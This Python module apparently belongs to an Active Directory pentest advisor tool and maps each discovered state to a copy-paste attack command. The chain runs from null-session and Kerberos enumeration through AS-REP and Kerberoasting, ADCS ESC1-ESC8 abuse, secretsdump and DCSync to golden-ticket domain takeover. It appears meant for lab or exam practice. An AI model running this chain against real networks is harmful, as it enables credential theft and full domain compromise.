"""Advisor rules.

Each rule looks at the current State and yields Recommendations - manual next
steps with a copy-paste command. Nothing here runs anything. To add a mindmap
branch, write a _r_* function and register it in ALL_RULES.

Placeholders left in suggested_cmd for you to fill:
  {dc} DC IP   {domain} FQDN   {user} a held user   {pw} password / -H hash
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Callable, Iterable

from ..core.models import Phase, Recommendation, Severity
from ..core.state import State


@dataclass
class Rule:
    id: str
    phase: Phase
    check: Callable[[State], Iterable[Recommendation]]


# unauth (no creds)

def _r_smb_null(state: State) -> Iterable[Recommendation]:
    if not state.hosts():
        return
    yield Recommendation(
        title="Enumerate via SMB null / guest sessions",
        action="Try null and guest sessions on every SMB host for shares, "
               "users and the domain SID (feeds RID cycling).",
        suggested_cmd="nxc smb {targets} -u '' -p '' --shares --users --rid-brute",
        tool="netexec",
        mindmap_node="Unauth > SMB > Null/Guest session",
        severity=Severity.MEDIUM,
        rationale="SMB hosts discovered; unauthenticated enumeration not yet exhausted.",
        unlocks="User list, share access, domain SID.",
    )


def _r_ldap_anon(state: State) -> Iterable[Recommendation]:
    dcs = state.dcs()
    if not dcs:
        return
    yield Recommendation(
        title="Anonymous LDAP bind",
        action="Attempt an anonymous bind against the DC to dump users, "
               "descriptions (often hold passwords) and the naming context.",
        suggested_cmd="ldapsearch -x -H ldap://{dc} -s base namingcontexts   # then -b <base> '(objectClass=user)'",
        tool="ldapsearch",
        mindmap_node="Unauth > LDAP > Anonymous bind",
        severity=Severity.MEDIUM,
        rationale=f"DC identified ({dcs[0].ip}); anonymous LDAP not yet confirmed.",
        unlocks="Usernames, description-field passwords.",
    )


def _r_user_enum(state: State) -> Iterable[Recommendation]:
    if state.users() or not state.dcs():
        return
    yield Recommendation(
        title="Kerberos username enumeration",
        action="Enumerate valid usernames via Kerberos pre-auth (no lockout risk) "
               "using a wordlist. Populates the user table for roasting.",
        suggested_cmd="kerbrute userenum -d {domain} --dc {dc} users.txt",
        tool="kerbrute",
        mindmap_node="Unauth > Kerberos > User enumeration",
        severity=Severity.LOW,
        rationale="DC present but no users known yet.",
        unlocks="Valid usernames (input for AS-REP / spray).",
    )


def _r_asrep(state: State) -> Iterable[Recommendation]:
    roastable = [u for u in state.users() if u.dont_require_preauth]
    if not roastable and state.users():
        # users known, preauth flag not checked yet
        yield Recommendation(
            title="AS-REP roast check",
            action="Request AS-REP for all known users; any without pre-auth "
                   "returns a crackable hash, no creds required.",
            suggested_cmd="impacket-GetNPUsers {domain}/ -dc-ip {dc} -usersfile users.txt -no-pass -format hashcat",
            tool="impacket-GetNPUsers",
            mindmap_node="Unauth > Kerberos > AS-REP Roasting",
            severity=Severity.MEDIUM,
            rationale="User list known; DONT_REQ_PREAUTH not yet checked.",
            unlocks="Offline-crackable user hashes (hashcat -m 18200).",
        )
    for u in roastable:
        yield Recommendation(
            title=f"AS-REP roast: {u.username}",
            action=f"{u.username} has DONT_REQ_PREAUTH set; grab and crack the AS-REP.",
            suggested_cmd=f"impacket-GetNPUsers {{domain}}/{u.username} -dc-ip {{dc}} -no-pass -format hashcat",
            tool="impacket-GetNPUsers / hashcat",
            mindmap_node="Unauth > Kerberos > AS-REP Roasting",
            severity=Severity.HIGH,
            rationale="User flagged DONT_REQ_PREAUTH.",
            unlocks="This user's password (if crackable).",
        )


# authed (valid domain user)

def _r_bloodhound(state: State) -> Iterable[Recommendation]:
    if not state.credentials(validated_only=True):
        return
    yield Recommendation(
        title="Collect BloodHound data",
        action="Run a full BloodHound collection to map ACLs, sessions and "
               "attack paths. This is your primary authed-phase map.",
        suggested_cmd="bloodhound-python -d {domain} -u {user} -p {pw} -ns {dc} -c All --zip",
        tool="bloodhound-python",
        mindmap_node="Authed > Situational awareness > BloodHound",
        severity=Severity.HIGH,
        rationale="Valid credentials held; graph not yet collected.",
        unlocks="Full ACL/path graph -> targeted privesc.",
    )


def _r_kerberoast(state: State) -> Iterable[Recommendation]:
    if not state.credentials(validated_only=True):
        return
    spn_users = [u for u in state.users() if u.spn]
    detail = f"{len(spn_users)} SPN account(s) known." if spn_users else "Enumerate SPNs first."
    yield Recommendation(
        title="Kerberoast SPN accounts",
        action="Request service tickets for all SPN-holding accounts and crack "
               "offline. " + detail,
        suggested_cmd="impacket-GetUserSPNs {domain}/{user}:{pw} -dc-ip {dc} -request -outputfile kerb.hashes",
        tool="impacket-GetUserSPNs / hashcat -m 13100",
        mindmap_node="Authed > Kerberos > Kerberoasting",
        severity=Severity.HIGH,
        rationale="Any authenticated user can request SPN tickets.",
        unlocks="Service account passwords (often high-priv).",
    )


def _r_shares_loot(state: State) -> Iterable[Recommendation]:
    if not state.credentials(validated_only=True):
        return
    readable = [s for s in state.shares() if s.readable]
    if not readable:
        yield Recommendation(
            title="Spider readable shares",
            action="Authenticated share enumeration + spidering for creds, "
                   "scripts, and configs (unattend.xml, web.config, .kdbx).",
            suggested_cmd="nxc smb {targets} -u {user} -p {pw} -M spider_plus",
            tool="netexec",
            mindmap_node="Authed > SMB > Share spidering",
            severity=Severity.MEDIUM,
            rationale="Creds held; shares not yet spidered.",
            unlocks="Plaintext creds / sensitive files.",
        )


def _r_gpp(state: State) -> Iterable[Recommendation]:
    if not state.credentials(validated_only=True):
        return
    yield Recommendation(
        title="Hunt GPP cpassword in SYSVOL",
        action="Search SYSVOL for Groups.xml cpassword (decryptable with a "
               "public AES key) and other GPO-stored secrets.",
        suggested_cmd="nxc smb {dc} -u {user} -p {pw} -M gpp_password -M gpp_autologin",
        tool="netexec",
        mindmap_node="Authed > SYSVOL > GPP cpassword",
        severity=Severity.MEDIUM,
        rationale="Authenticated read of SYSVOL is possible.",
        unlocks="Decryptable stored passwords.",
    )


# abuse steps per ESC once certipy has flagged it. {t} = template/CA name.
ESC_PLAYBOOK: dict[str, tuple[str, str, str]] = {
    "ESC1": (
        "Template allows an enrollee-supplied SAN + client auth. Request a "
        "cert as a privileged user, then authenticate with it.",
        "certipy req -u {user}@{domain} -p {pw} -dc-ip {dc} -ca <CA> -template {t} "
        "-upn administrator@{domain}   # then: certipy auth -pfx administrator.pfx -dc-ip {dc}",
        "A TGT / NT hash for the impersonated privileged user.",
    ),
    "ESC2": (
        "Template has Any-Purpose (or no) EKU, usable like ESC1 to impersonate.",
        "certipy req -u {user}@{domain} -p {pw} -ca <CA> -template {t} -upn administrator@{domain}",
        "Cert usable for auth as a privileged user.",
    ),
    "ESC3": (
        "Enrollment Agent template. Request an agent cert, then enrol on "
        "behalf of a privileged user.",
        "certipy req ... -template {t}   # then -on-behalf-of {domain}\\administrator",
        "Cert for an arbitrary user via the agent.",
    ),
    "ESC4": (
        "You have write rights over the template. Reconfigure it into an ESC1, "
        "abuse, then restore.",
        "certipy template -u {user}@{domain} -p {pw} -template {t} -save-old   # then ESC1 flow",
        "Full control to mint a privileged cert.",
    ),
    "ESC6": (
        "CA has EDITF_ATTRIBUTESUBJECTALTNAME2, any template lets you set SAN.",
        "certipy req ... -template <any-client-auth> -upn administrator@{domain}",
        "Privileged cert via arbitrary SAN.",
    ),
    "ESC7": (
        "You hold ManageCA/ManageCertificates on the CA. Enable SAN or approve "
        "a pending request to reach ESC1/ESC6.",
        "certipy ca -u {user}@{domain} -p {pw} -ca {t} -list-templates   # then manage/approve",
        "Control of the CA -> privileged cert.",
    ),
    "ESC8": (
        "Web enrollment + NTLM relay. Coerce a DC and relay to the CA's HTTP "
        "endpoint to obtain a DC cert.",
        "certipy relay -target 'http://{t}' -template DomainController   # coerce with PetitPotam/printerbug",
        "A DC certificate -> DCSync / full domain.",
    ),
}
_GENERIC_ESC = (
    "Certipy flagged this as vulnerable. Review the ESC technique and abuse it.",
    "certipy req -u {user}@{domain} -p {pw} -dc-ip {dc} -ca <CA> -template {t} ...",
    "Certificate-based privilege escalation.",
)


def _r_adcs(state: State) -> Iterable[Recommendation]:
    if not state.credentials(validated_only=True):
        return
    adcs_findings = [f for f in state.findings() if f.category == "adcs"]
    if not adcs_findings:
        yield Recommendation(
            title="Enumerate ADCS for ESC misconfigs",
            action="Find the CA and vulnerable templates (ESC1-ESC16). "
                   "Certipy flags exploitable ones automatically.",
            suggested_cmd="certipy find -u {user}@{domain} -p {pw} -dc-ip {dc} -vulnerable -stdout",
            tool="certipy",
            mindmap_node="Authed > ADCS > Enumeration (ESC1-16)",
            severity=Severity.HIGH,
            rationale="Creds held; ADCS not yet enumerated.",
            unlocks="Certificate-based privesc to domain admin.",
        )
        return
    for f in adcs_findings:
        m = re.search(r"(ESC\d+)", f.title)
        esc = m.group(1) if m else "ESC?"
        name = f.title.split(":", 1)[1].strip() if ":" in f.title else "<template>"
        action, cmd, unlocks = ESC_PLAYBOOK.get(esc, _GENERIC_ESC)
        yield Recommendation(
            title=f"Abuse {esc} on '{name}'",
            action=action,
            suggested_cmd=cmd.format(t=name, user="{user}", domain="{domain}",
                                     pw="{pw}", dc="{dc}"),
            tool="certipy",
            mindmap_node=f"Authed > ADCS > {esc}",
            severity=Severity.CRITICAL if esc in ("ESC1", "ESC6", "ESC8") else Severity.HIGH,
            rationale=f"Certipy flagged '{name}' as {esc}.",
            unlocks=unlocks,
        )


def _r_loot(state: State) -> Iterable[Recommendation]:
    for f in state.findings():
        if f.category != "loot" or f.severity != Severity.HIGH:
            continue
        parts = (f.evidence.split("|", 2) + ["", "", ""])[:3]
        host, share, path = parts
        yield Recommendation(
            title=f"Inspect sensitive file: \\{share}\\{path}",
            action="Download and review this file for credentials, keys or "
                   "connection strings. " + f.detail,
            suggested_cmd=f"smbclient //{host}/{share} -U '{{user}}%{{pw}}' "
                          f"-c 'get \"{path}\"'",
            tool="smbclient / nxc --get-file",
            mindmap_node="Authed > Shares > Sensitive files",
            severity=Severity.MEDIUM,
            rationale=f.detail,
            unlocks="Possible plaintext credentials / private keys.",
        )


def _r_winrm(state: State) -> Iterable[Recommendation]:
    for f in state.findings():
        if f.category != "access" or not f.title.startswith("WinRM shell:"):
            continue
        host, user = (f.evidence.split("|", 1) + ["", ""])[:2]
        yield Recommendation(
            title=f"WinRM shell on {host}",
            action=f"{user} can log in over WinRM; get an interactive shell.",
            suggested_cmd=f"evil-winrm -i {host} -u {user} -p '<password>'",
            tool="evil-winrm",
            mindmap_node="Authed > Lateral movement > WinRM",
            severity=Severity.HIGH,
            rationale="Valid WinRM auth confirmed by the check module.",
            unlocks="Interactive shell on the host.",
        )


def _r_spray_gate(state: State) -> Iterable[Recommendation]:
    # spraying stays a manual, warned suggestion (lockout risk)
    if state.credentials(validated_only=True) or not state.users():
        return
    yield Recommendation(
        title="(Manual, gated) Password spray - LOCKOUT RISK",
        action="Only after checking the account lockout policy. One password, "
               "all users, with a long delay. Do NOT automate on the exam AD set.",
        suggested_cmd="# check policy first:  nxc smb {dc} -u {user} -p {pw} --pass-pol\n"
                      "# then, carefully:      nxc smb {dc} -u users.txt -p 'Season2025!' --continue-on-success",
        tool="netexec (manual)",
        mindmap_node="Unauth/Authed > Password spraying",
        severity=Severity.LOW,
        rationale="Known users but no valid creds; spraying is an option, but it "
                  "is noisy and can lock accounts, so it stays manual.",
        unlocks="A first valid credential.",
    )


# privileged (local admin somewhere / high-value account)

def _r_secretsdump(state: State) -> Iterable[Recommendation]:
    admin_creds = [c for c in state.credentials() if c.admin_on]
    for c in admin_creds:
        for host in c.admin_on:
            yield Recommendation(
                title=f"Dump secrets on {host}",
                action=f"{c.username} is local admin on {host}; dump SAM/LSA/LSASS "
                       "for cached creds and local hashes.",
                suggested_cmd=f"impacket-secretsdump {{domain}}/{c.username}@{host}   # add -hashes or :pw",
                tool="impacket-secretsdump",
                mindmap_node="Privileged > Credential access > secretsdump",
                severity=Severity.HIGH,
                rationale=f"Local admin on {host}.",
                unlocks="More hashes -> lateral movement.",
            )


def _r_dcsync(state: State) -> Iterable[Recommendation]:
    dc_ips = {h.ip for h in state.dcs()} | {h.hostname for h in state.dcs() if h.hostname}
    for c in state.credentials():
        if set(c.admin_on) & dc_ips:
            yield Recommendation(
                title="DCSync the domain",
                action=f"{c.username} has admin on a DC; replicate and pull the "
                       "krbtgt + all hashes (game over).",
                suggested_cmd="impacket-secretsdump {domain}/{user}:{pw}@{dc} -just-dc",
                tool="impacket-secretsdump -just-dc",
                mindmap_node="Privileged > Domain dominance > DCSync",
                severity=Severity.CRITICAL,
                rationale=f"{c.username} is admin on a DC.",
                unlocks="krbtgt hash -> golden ticket, full domain compromise.",
            )
            return


def _r_delegation(state: State) -> Iterable[Recommendation]:
    unconstrained = [u for u in state.users() if u.trusted_for_delegation]
    for u in unconstrained:
        yield Recommendation(
            title=f"Unconstrained delegation abuse: {u.username}",
            action=f"{u.username} is trusted for UNCONSTRAINED delegation. If you "
                   "control it, coerce a DC to authenticate to it and capture the "
                   "DC's TGT from memory.",
            suggested_cmd="# on the controlled host: rubeus monitor / impacket-krbrelayx, "
                          "then coerce with PetitPotam/printerbug -> extract DC$ TGT",
            tool="krbrelayx / rubeus",
            mindmap_node="Authed/Privileged > Kerberos delegation > Unconstrained",
            severity=Severity.HIGH,
            rationale="TRUSTED_FOR_DELEGATION flag set.",
            unlocks="A DC TGT -> DCSync / full domain.",
        )


def _r_constrained_delegation(state: State) -> Iterable[Recommendation]:
    for f in state.findings():
        if f.category == "kerberos" and f.title.startswith("Constrained delegation:"):
            acct = f.title.split(":", 1)[1].strip()
            yield Recommendation(
                title=f"Constrained delegation abuse: {acct}",
                action=f"If you hold {acct}'s creds, use S4U to impersonate a "
                       "privileged user to the allowed service. " + f.detail,
                suggested_cmd="impacket-getST -spn <target-spn> -impersonate administrator "
                              "-dc-ip {dc} {domain}/" + acct + ":<password>",
                tool="impacket-getST",
                mindmap_node="Authed/Privileged > Kerberos delegation > Constrained",
                severity=Severity.HIGH,
                rationale=f"{acct} has constrained delegation rights.",
                unlocks="Service ticket as an impersonated privileged user.",
            )


ALL_RULES: list[Rule] = [
    # unauth
    Rule("smb-null", Phase.UNAUTH, _r_smb_null),
    Rule("ldap-anon", Phase.UNAUTH, _r_ldap_anon),
    Rule("user-enum", Phase.UNAUTH, _r_user_enum),
    Rule("asrep", Phase.UNAUTH, _r_asrep),
    Rule("spray-gate", Phase.UNAUTH, _r_spray_gate),
    # authed
    Rule("bloodhound", Phase.AUTHED, _r_bloodhound),
    Rule("kerberoast", Phase.AUTHED, _r_kerberoast),
    Rule("shares", Phase.AUTHED, _r_shares_loot),
    Rule("loot", Phase.AUTHED, _r_loot),
    Rule("winrm", Phase.AUTHED, _r_winrm),
    Rule("gpp", Phase.AUTHED, _r_gpp),
    Rule("adcs", Phase.AUTHED, _r_adcs),
    Rule("delegation", Phase.AUTHED, _r_delegation),
    Rule("constrained-delegation", Phase.AUTHED, _r_constrained_delegation),
    # privileged
    Rule("secretsdump", Phase.PRIVILEGED, _r_secretsdump),
    Rule("dcsync", Phase.PRIVILEGED, _r_dcsync),
]
